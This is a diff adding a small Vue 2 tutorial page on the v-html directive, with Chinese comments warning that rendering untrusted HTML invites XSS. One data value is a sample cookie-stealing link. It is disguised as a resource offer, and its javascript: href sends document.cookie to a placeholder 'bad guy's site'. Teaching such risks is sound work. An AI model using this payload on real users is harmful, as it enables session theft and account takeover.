@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <title>v-html指令.html</title>
+  <script type="text/javascript" src="../js/vue.js"></script>
+</head>
+
+<body>
+
+  <div id="root">
+    <div v-html='name'> v-html 指令 --- v-text指令也会替换掉节点内的所有内容</div>
+    <div v-html='str'></div>
+    <div v-html='str2'></div>
+  </div>
+
+  <script type="text/javascript">
+    Vue.config.productionTip = false
+    new Vue({
+      el: '#root',
+      data: {
+        name: 'kobe',
+        str: '<h3>v-html可以解析节点</h3>',
+        str2: '<a href=javascript:location.href="http://坏人的网站?"+document.cookie>兄弟我找到了你想要的资源</a>'
+      }
+    })
+  </script>
+
+  <!-- 
+    v-html：
+      作用: 向指定节点内渲染包含html结构的内容
+      也是会替换掉节点内的所以内容
+      并且能够解析节点
+
+      严重注意：v-html有安全性问题
+      在网站上动态渲染任意HTNL是非常危险的，容易导致 XSS (冒充用户之手) 攻击
+      一定要在可信的内容上使用 v-html，永远不要在用户提交的内容上使用b-html
+      
+   -->
+
+</body>
+
+</html>
